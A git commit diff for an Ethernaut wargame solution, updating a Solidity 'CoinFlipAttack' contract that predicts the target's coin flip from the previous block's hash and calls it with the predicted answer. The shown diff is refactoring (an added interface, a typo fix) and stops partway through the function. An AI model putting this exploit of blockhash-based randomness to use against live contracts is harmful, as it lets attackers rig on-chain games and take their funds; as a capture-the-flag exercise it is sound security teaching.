2969d8a698ce7d6ff90de6927bf53671c9ef8c6a
Çağatay Akkaş <108520279+CagatayAkkas@users.noreply.github.com>
2023-05-02 15:50:57 +0300

    Update CoinFlipAttack.sol

--- Ethernaut/CoinFlipAttack.sol
+++ Ethernaut/CoinFlipAttack.sol
@@ -1,15 +1,21 @@
-pragma solidity 0.8.9;
-import "./CoinFlip.sol";
+pragma solidity ^0.8.0;
+
+interface ICoinFlip {
+    function consecutiveWins() external view returns (uint256);
+
+    function flip(bool) external returns (bool);
+}
 
 contract CoinFlipAttack {
-    CoinFlip enemyContract;
-    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    ICoinFlip enemyContract;
+    uint256 FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
     constructor(address _enemyAddress) public {
-        enemyContract = CoinFlip(_enemyAddress);
+        enemyContract = ICoinFlip(_enemyAddress);
     }
 
-    function filp() public returns (bool) {
+    function flip() public returns (bool) {
         uint256 blockValue = uint256(blockhash(block.number - 1));
         uint256 CoinFlip = uint256(blockValue / FACTOR);
         bool side = CoinFlip == 1 ? true : false;
